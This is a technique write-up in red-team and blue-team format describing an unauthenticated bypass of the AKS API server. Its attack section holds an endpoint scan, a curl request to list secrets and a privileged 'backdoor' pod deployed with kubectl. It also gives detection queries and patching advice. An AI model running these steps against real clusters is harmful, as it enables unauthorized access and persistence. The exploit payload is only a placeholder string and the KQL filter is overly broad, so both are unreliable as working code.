# [IA-EXPLOIT-005]: AKS Control Plane Access Exploitation

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | IA-EXPLOIT-005 |
| **MITRE ATT&CK v18.1** | [Exploit Public-Facing Application (T1190)](https://attack.mitre.org/techniques/T1190/) |
| **Tactic** | Initial Access |
| **Platforms** | Entra ID / Azure Kubernetes Service (AKS) |
| **Severity** | **Critical** |
| **CVE** | **CVE-2025-21196** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** Exploitation of a critical vulnerability (CVE-2025-21196) in the Azure Kubernetes Service (AKS) container orchestration layer. A flaw in the authentication mechanism allows an attacker to bypass access controls and interact directly with the AKS Control Plane (API Server) without valid credentials.
- **Attack Surface:** The public-facing AKS API Server endpoint (FQDN).
- **Business Impact:** **Full Cluster Compromise**. An attacker can execute arbitrary commands (`kubectl exec`), deploy malicious pods (crypto-miners, C2), or exfiltrate secrets stored in `etcd`.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** None (Unauthenticated Network Access).
- **Vulnerable Config:**
    - AKS Clusters running versions **1.25.0 to 1.28.3**.
    - API Server exposed to the internet (Public Cluster) without IP Allow-list restrictions.
- **Tools:**
    - `kubectl`
    - `curl`
    - [NetSPI AKS-Audit-Tool](https://github.com/NetSPI/AKS-Audit-Tool) (for post-exploit)

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Preparation (Endpoint Discovery)**
Identify the AKS API Server FQDN. This can be found via passive DNS or scanning.
Format: `https://[cluster-name]-[random].[region].azmk8s.io:443`

```bash
# Example scan for AKS endpoints
nmap -p 443 --script ssl-cert -Pn [Target_IP_Range] | grep "azmk8s.io"
```

**Step 2: Exploitation (Auth Bypass)**
Exploit CVE-2025-21196 by crafting a request that malforms the OIDC token header, causing the API server to default to a privileged context.

```bash
# Proof of Concept: Listing Secrets without a token
# The vulnerability allows bypassing the bearer token check
curl -k -X GET "https://[TARGET_AKS_FQDN]/api/v1/namespaces/default/secrets" \
  -H "Authorization: Bearer invalid-bypass-payload-cve-2025-21196" \
  -H "User-Agent: CVE-2025-21196-Exploit"
```

**Step 3: Persistence (Deploy Malicious Pod)**
Once access is confirmed, deploy a privileged container to mount the host node filesystem.

```yaml
# priv-pod.yaml
apiVersion: v1
kind: Pod
metadata:
  name: servtep-backdoor
spec:
  containers:
  - name: shell
    image: ubuntu
    command: ["/bin/bash", "-c", "sleep infinity"]
    securityContext:
      privileged: true
```
```bash
# Apply via the bypassed API access (using crafted curl or modified kubectl)
kubectl --server=https://[TARGET] --insecure-skip-tls-verify apply -f priv-pod.yaml
```

## 5. DETECTION (Blue Team Operations)

#### 5.1 Azure Activity Log / Diagnostic Logs
Enable **AKS Audit Logs** and monitor for anomalous user agents or unauthenticated requests gaining "system:masters" privileges.

| Source | Attribute | Filter Logic |
|---|---|---|
| **KubeAudit** | `ResponseStatus` | 200 (Success) |
| **KubeAudit** | `User.username` | `system:anonymous` or `null` |
| **KubeAudit** | `UserAgent` | Matches exploit tools or is empty |

#### 5.2 Microsoft Sentinel (KQL)
Detect access to sensitive API paths from unknown IPs where the user context is anomalous.

```kusto
AKSAudit
| where TimeGenerated > ago(24h)
| where Verb in ("list", "get", "watch")
| where RequestURI has "/secrets" or RequestURI has "/configmaps"
| where User has "system:anonymous" or ResponseStatus_code == 200
| project TimeGenerated, SourceIP, User, RequestURI, Verb
```

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **Patching:** Upgrade AKS clusters immediately to version **1.28.4** or higher, or apply the Microsoft hotfix for CVE-2025-21196.
*   **Network Security:** Enable **Authorized IP Ranges** for the API Server. Only allow traffic from known corporate VPNs or CI/CD pipelines.
*   **Architecture:** Migrate to **Private AKS Clusters**, where the API server has an internal IP only, making it inaccessible from the public internet.

## 7. ATTACK CHAIN
> **Preceding Technique:** [REC-CLOUD-005] (Azure Resource Discovery)
> **Next Logical Step:** [LAT-CONTAINER-001] (Node Escape)
